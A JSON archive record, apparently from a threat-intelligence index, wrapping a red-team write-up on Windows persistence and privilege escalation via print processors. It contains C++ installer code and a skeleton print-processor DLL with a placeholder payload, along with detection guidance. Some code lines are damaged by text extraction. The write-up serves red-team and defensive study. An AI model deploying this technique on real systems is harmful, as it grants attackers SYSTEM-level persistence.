@@ -1,0 +1,268 @@
+{
+    "id": "89366dd1-e7a0-4fea-ba88-f73fdc62dbb9",
+    "created_at": "2023-01-12T15:05:48.419771Z",
+    "updated_at": "2025-03-27T02:14:02.482553Z",
+    "deleted_at": null,
+    "sha1_hash": "8257232f307440dfbf132d25bcb3661393cb431a",
+    "title": "2021-10-20 - Persistence and Privilege Escalation on Windows via Print Processors",
+    "authors": "",
+    "file_creation_date": "2022-05-28T17:01:28Z",
+    "file_modification_date": "2022-05-28T17:01:28Z",
+    "file_size": 109999,
+    "plain_text": "# Persistence and Privilege Escalation on Windows via Print Processors\n\n**stmxcsr.com/persistence/print-processor.html**\n\nMay 28, 2022\n\nThis article demonstrates a persistence and/or privilege escalation tehcnique documented as “Print Processors”\n[T1547.012 in the MITRE ATT&CK [1] framework. It has been used in many attacks by Advanced Persistent](https://attack.mitre.org/techniques/T1547/012/)\n[Threats (APTs) such as Winnti [3], [6] and Gelsemium [4], [5]. The privilege escalation allows an attacker escalate](https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/)\nfrom High integrity (Administrator) to System integrity (NT AUTHORITY\\SYSTEM). Particularly interesting is the\n[fact that it was used in the CCleaner [6] supply-chain attack. Direct or indirect references to this technique can](https://www.crowdstrike.com/blog/in-depth-analysis-of-the-ccleaner-backdoor-stage-2-dropper-and-its-payload/)\n[also be found in [7] and [2].](https://www.hexacorn.com/blog/2019/05/26/plata-o-plomo-code-injections-execution-tricks/)\n\nThis write-up aims to assist Red Teams reproduce this technique in Simulated Attack engagements and\ndemonstrate impact. It is useful from a DFIR perspective as it gives a little more context to investigators.\n\nThe article is layed out in the following sections:\n\n## Review of the technique\n\nTo perform this technique, the following are required:\n\na registry key that points to the print processor has to be created in\n\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\%ARCHITECTURE%\\Print\n\n```\n```\n   Processors\\ (the path is architecture specific)\n\n```\na call to GetPrintProcessorDirectory [[8] to get the suitable directory for the print processor (architecture-](https://docs.microsoft.com/en-us/windows/win32/printdocs/getprintprocessordirectory)\nspecific)\na call to AddPrintProcessor to register the print processor\nthe print processor (implemented in a DLL) has to export [10] the functions:\n_EnumPrintProcessorDatatypesW, OpenPrintProcessor, PrintDocumentOnPrintProcessor,_\n_ClosePrintProcessor, ControlPrintProcessor and GetPrintProcessorCapabilities_\n\nTo confirm what functions Print Spooler calls, Rohitab’s ApiMonitor shows the APIs:\n\n## Print Processor Installation Source Code\n\nThe following code creates the required keys and values in\n\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print\n\n```\n\n`Processors\\ and calls the AddPrintProcessor` [[9] API to register the print processor.](https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor)\n\n\n-----\n\n```\n       g y y ( p )\n{\n     // lpData : DLL name\n     LSTATUS status = -1;\n     WCHAR lpSubKey[] = L\"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Print\\\\Environments\\\\Windows x64\\\\Print\nProcessors\\\\printprocessor\";\n     HKEY phkResult = 0;\n     DWORD dwDisposition = 0;\n     status = ::RegCreateKeyExW(HKEY_LOCAL_MACHINE, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE,\nKEY_CREATE_SUB_KEY, NULL, &phkResult, &dwDisposition);\n     if (status)\n     {\n          ::wprintf(L\"[-] RegCreateKeyExW has failed: %d\\n\", ::GetLastError());\n          return status;\n     }\n     phkResult = 0;\n     status = ::RegOpenKeyExW(HKEY_LOCAL_MACHINE, lpSubKey, 0, NULL, &phkResult);\n     if (status)\n     {\n          ::wprintf(L\"[-] RegOpenKeyW has failed: %d\\n\", ::GetLastError());\n          return status;\n     }\n     WCHAR lpValueName[] = L\"Driver\";\n     status = ::RegSetKeyValueW(HKEY_LOCAL_MACHINE, lpSubKey, lpValueName, REG_SZ, lpData,\nwcslen(lpData)*2 + 1);\n     if (status)\n     {\n          ::wprintf(L\"[-] RegSetKeyValueW has failed: %d\\n\", ::GetLastError());\n          return status;\n     }\n     status = ::RegCloseKey(phkResult);\n     if (status)\n     {\n          ::wprintf(L\"[-] RegCloseKey has failed: %d\\n\", ::GetLastError());\n          return status;\n     }\n     return status;\n}\nBOOL PrintProcessorPersistence()\n{\n     BOOL res = 0;\n     WCHAR pPathName[] = L\"printprocessor.dll\";\n     res = CreateRegistryKeyPrintProcessor(pPathName);\n     if (res)\n     {\n          ::wprintf(L\"[-] CreateRegistryKeyPrintProcessor has failed\\n\");\n          return 0;\n     }\n     WCHAR pEnvironment[] = L\"Windows x64\";\n     DWORD pcbNeeded = 0;\n     GetPrintProcessorDirectoryW(NULL, pEnvironment, 1, NULL, NULL, &pcbNeeded);\n     WCHAR* pPrintProcessorInfo = new WCHAR[pcbNeeded];\n     res = GetPrintProcessorDirectoryW(NULL, pEnvironment, 1, (LPBYTE)pPrintProcessorInfo, pcbNeeded,\n&pcbNeeded);\n     if (res == 0)\n     {\n          ::wprintf(L\"[-] GetPrintProcessorDirectory has failed: %d\\n\", GetLastError());\n          return 0;\n\n```\n\n-----\n\n```\n     }\n     //::wprintf(L\"[+] pPrintProcessorInfo: %s\\n\", pPrintProcessorInfo);\n     // AddPrintProcessor\n     WCHAR pPrintPRocessorName[] = L\"Test Processor\";\n     res = AddPrintProcessorW(NULL, pEnvironment, pPathName, pPrintPRocessorName);\n     if (res == 0)\n     {\n          ::wprintf(L\"[-] AddPrintProcessor has failed: %d\\n\", GetLastError());\n          return 0;\n     }\n     return 1;\n}\nINT wmain(INT argc, WCHAR** argv)\n{\n     BOOL res = PrintProcessorPersistence();\n     if (res == 0)\n     {\n          ::wprintf(L\"[-] PrintProcessorPersistence has failed\\n\");\n          return 0;\n     }\n     return 1\n}\n\n## Print Processor DLL Source Code\n\n```\n[The DLL that implements the Print Processor has to export a number of functions [10]. As soon as the DLL is](https://docs.microsoft.com/en-us/windows-hardware/drivers/print/functions-defined-by-print-processors)\nloaded in the address space of spoolsv.exe, the function EnumPrintProcessorDatatypesW is executed.\n\n\n-----\n\n```\n#include <stdio.h>\n#define DllExport __declspec(dllexport)\nextern \"C\" DllExport BOOL ClosePrintProcessor(HANDLE hPrintProcessor)\n{\n     return 1;\n}\nextern \"C\" DllExport BOOL ControlPrintProcessor(HANDLE hPrintProcessor, DWORD Command)\n{\n     return 1;\n}\nBOOL EnumPrintProcessorDatatypesW(LPWSTR pName, LPWSTR pPrintProcessorName, DWORD Level, LPBYTE\npDatatypes, DWORD cbBuf, LPDWORD pcbNeeded, LPDWORD pcReturned)\n{\n     // executes when DLL is loaded\n     return 1;\n}\nextern \"C\" DllExport DWORD GetPrintProcessorCapabilities(LPTSTR pValueName, DWORD dwAttributes,\nLPBYTE pData, DWORD nSize, LPDWORD pcbNeeded)\n{\n     return 0;\n}\ntypedef struct _PRINTPROCESSOROPENDATA {\n     PDEVMODE pDevMode;\n     LPWSTR  pDatatype;\n     LPWSTR  pParameters;\n     LPWSTR  pDocumentName;\n     DWORD  JobId;\n     LPWSTR  pOutputFile;\n     LPWSTR  pPrinterName;\n} PRINTPROCESSOROPENDATA, * PPRINTPROCESSOROPENDATA, * LPPRINTPROCESSOROPENDATA;\nextern \"C\" DllExport HANDLE OpenPrintProcessor(LPWSTR pPrinterName, PPRINTPROCESSOROPENDATA\npPrintProcessorOpenData)\n{\n     return (HANDLE)11;\n}\nextern \"C\" DllExport BOOL PrintDocumentOnPrintProcessor(HANDLE hPrintProcessor, LPWSTR pDocumentName)\n{\n     return 1;\n}\nint __cdecl PayloadFunction()\n{\n     // debug\n     CHAR msgbuf[50];\n     sprintf_s(msgbuf, 50, \"[+] PayloadFunction was called\");\n     ::OutputDebugStringA(msgbuf);\n     return 0;\n}\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)\n{\n     switch (fdwReason)\n     {\n     case DLL_PROCESS_ATTACH:\n          PayloadFunction();\n          break;\n     case DLL THREAD ATTACH:\n\n```\n\n-----\n\n```\n          _ _\n     case DLL_THREAD_DETACH:\n          break;\n     }\n     return 1;\n}\n\n## Detection Opportunities\n\n```\nEvents to monitor that could potentially indicate suspicious activity are:\n\nAPI calls to AddPrintProcessor\nFile write events to ‘C:\\Windows\\system32\\spool\\PRTPROCS\\x64'\nRegistry key creation in\n\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print\n\n```\n```\nProcessors\\\n\n```\n\nWith the aforementioned indicators in mind, hunting can be implemented in Windows environments. Non-default\nprint processors installed in a small number of hosts within an estate should be analyzed.\n\n[Additionally, for those familiar with VirusTotal Enterprise platform, the following search modifiers [11] will likely](https://support.virustotal.com/hc/en-us/articles/360001385897-File-search-modifiers)\nreturn malware Print Processor DLLs:\n\ntype:pedll exports:”EnumPrintProcessorDatatypesW” positives:30+\n\nThe above query looks for the exported function EnumPrintProcessorDatatypesW in DLL files that have 30 or\nmore detections by antivirus engines. As mentioned earlier, there are a number (actually six) funtions that should\nbe exported to successfully implement this technique and therefore additional function names can be used in the\nsearch.\n\n## Tools\n\nVisual Studio\nRohitab’s ApiMonitor\nSysInternals DebugView\nSysInternals ProcMon\n\n## References\n\n[1] https://attack.mitre.org/techniques/T1547/012/\n\n[2] https://www.welivesecurity.com/wp-content/uploads/200x/white-papers/The_Evolution_of_TDL.pdf\n\n[3] https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/\n\n[4] https://www.welivesecurity.com/2021/06/09/gelsemium-when-threat-actors-go-gardening/\n\n[5] https://www.welivesecurity.com/wp-content/uploads/2021/06/eset_gelsemium.pdf\n\n[6] https://www.crowdstrike.com/blog/in-depth-analysis-of-the-ccleaner-backdoor-stage-2-dropper-and-its-payload/\n\n[7] https://www.hexacorn.com/blog/2019/05/26/plata-o-plomo-code-injections-execution-tricks/\n\n[8] https://docs.microsoft.com/en-us/windows/win32/printdocs/getprintprocessordirectory\n\n[9] https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor\n\n\n-----\n\n[10] https://docs.microsoft.com/en us/windows hardware/drivers/print/functions defined by print processors\n\n[11] https://support.virustotal.com/hc/en-us/articles/360001385897-File-search-modifiers\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-20 - Persistence and Privilege Escalation on Windows via Print Processors.pdf"
+    ],
+    "report_names": [
+        "2021-10-20 - Persistence and Privilege Escalation on Windows via Print Processors.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "77874718-7ad2-4d15-9831-10935ab9bcbe",
+            "created_at": "2022-10-25T15:50:23.619911Z",
+            "updated_at": "2025-03-27T02:00:55.50722Z",
+            "deleted_at": null,
+            "main_name": "Gelsemium",
+            "aliases": [
+                "Gelsemium"
+            ],
+            "source_name": "MITRE:Gelsemium",
+            "tools": [
+                "Gelsemium",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "2d4d2356-8f9e-464d-afc6-2403ce8cf424",
+            "created_at": "2023-01-06T13:46:39.290101Z",
+            "updated_at": "2025-03-27T02:00:03.041564Z",
+            "deleted_at": null,
+            "main_name": "Gelsemium",
+            "aliases": [
+                "狼毒草"
+            ],
+            "source_name": "MISPGALAXY:Gelsemium",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "b5449533-0ff1-4048-999d-7d4bfd8e6da6",
+            "created_at": "2022-10-25T16:07:24.114365Z",
+            "updated_at": "2025-03-27T02:02:10.111256Z",
+            "deleted_at": null,
+            "main_name": "RedDelta",
+            "aliases": [
+                "Operation Dianxun",
+                "TA416"
+            ],
+            "source_name": "ETDA:RedDelta",
+            "tools": [
+                "Agent.dhwf",
+                "Agentemis",
+                "Chymine",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Darkmoon",
+                "Destroy RAT",
+                "DestroyRAT",
+                "Gen:Trojan.Heur.PT",
+                "Kaba",
+                "Korplug",
+                "PlugX",
+                "Poison Ivy",
+                "RedDelta",
+                "SPIVY",
+                "Sogu",
+                "TIGERPLUG",
+                "TVT",
+                "Thoper",
+                "Xamtrav",
+                "cobeacon",
+                "pivy",
+                "poisonivy"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "5bbced13-72f7-40dc-8c41-dcce75bf885e",
+            "created_at": "2022-10-25T15:50:23.695735Z",
+            "updated_at": "2025-03-27T02:00:55.525839Z",
+            "deleted_at": null,
+            "main_name": "Winnti Group",
+            "aliases": [
+                "Winnti Group"
+            ],
+            "source_name": "MITRE:Winnti Group",
+            "tools": [
+                "PipeMon",
+                "Winnti for Windows",
+                "PlugX"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "945a572f-ebe3-4e2f-a288-512fe751cfa8",
+            "created_at": "2022-10-25T16:07:24.413971Z",
+            "updated_at": "2025-03-27T02:02:10.212853Z",
+            "deleted_at": null,
+            "main_name": "Winnti Group",
+            "aliases": [
+                "Wicked Panda",
+                "Winnti Group"
+            ],
+            "source_name": "ETDA:Winnti Group",
+            "tools": [
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "FunnySwitch",
+                "RbDoor",
+                "RibDoor",
+                "RouterGod",
+                "Winnti",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "b5550c4e-943a-45ea-bf67-875b989ee4c4",
+            "created_at": "2022-10-25T16:07:23.675771Z",
+            "updated_at": "2025-03-27T02:02:09.918749Z",
+            "deleted_at": null,
+            "main_name": "Gelsemium",
+            "aliases": [
+                "Operation NightScout",
+                "Operation TooHash"
+            ],
+            "source_name": "ETDA:Gelsemium",
+            "tools": [
+                "ASPXSpy",
+                "ASPXTool",
+                "Agentemis",
+                "BadPotato",
+                "CHINACHOPPER",
+                "China Chopper",
+                "Chrommme",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "FireWood",
+                "Gelsemine",
+                "Gelsenicine",
+                "Gelsevirine",
+                "JuicyPotato",
+                "OwlProxy",
+                "Owowa",
+                "SAMRID",
+                "SessionManager",
+                "SinoChopper",
+                "SpoolFool",
+                "SweetPotato",
+                "WolfsBane",
+                "cobeacon",
+                "reGeorg"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
+            "created_at": "2024-05-01T02:03:07.930196Z",
+            "updated_at": "2025-03-27T02:05:17.251237Z",
+            "deleted_at": null,
+            "main_name": "BRONZE ATLAS",
+            "aliases": [
+                "Axiom",
+                "BARIUM ",
+                "Blackfly ",
+                "CTG-2633",
+                "GREF",
+                "Group 72 ",
+                "Red Kelpie ",
+                "TG-2633 ",
+                "Wicked Panda ",
+                "Winnti",
+                "APT41 "
+            ],
+            "source_name": "Secureworks:BRONZE ATLAS",
+            "tools": [
+                " CCleaner v5.33 backdoor",
+                " ChinaChopper",
+                " Cobalt Strike",
+                " Dicey MSDN",
+                " ForkPlayground",
+                " HUC Proxy Malware (Htran)",
+                " Mimikatz",
+                " PipeMon",
+                " PlugX",
+                " PortReuse",
+                " Powershell Empire",
+                " RCMD",
+                " RbDoor",
+                " SPEEDBOAT",
+                " ShadowPad",
+                " Sidewalk",
+                " Speculoos",
+                " TeamViewer",
+                " Winnkit",
+                " Winnti",
+                " reg save",
+                " vssadmin",
+                "Acehash"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "9baa7519-772a-4862-b412-6f0463691b89",
+            "created_at": "2022-10-25T15:50:23.354429Z",
+            "updated_at": "2025-03-27T02:00:55.45162Z",
+            "deleted_at": null,
+            "main_name": "Mustang Panda",
+            "aliases": [
+                "Mustang Panda",
+                "TA416",
+                "RedDelta",
+                "BRONZE PRESIDENT"
+            ],
+            "source_name": "MITRE:Mustang Panda",
+            "tools": [
+                "Cobalt Strike",
+                "RCSession",
+                "NBTscan",
+                "PoisonIvy",
+                "PlugX"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535948,
+    "ts_updated_at": 1743041642,
+    "ts_creation_date": 1653757288,
+    "ts_modification_date": 1653757288,
+    "files": {
+        "pdf": "https://archive.orkl.eu/8257232f307440dfbf132d25bcb3661393cb431a.pdf",
+        "text": "https://archive.orkl.eu/8257232f307440dfbf132d25bcb3661393cb431a.txt",
+        "img": "https://archive.orkl.eu/8257232f307440dfbf132d25bcb3661393cb431a.jpg"
+    }
+}
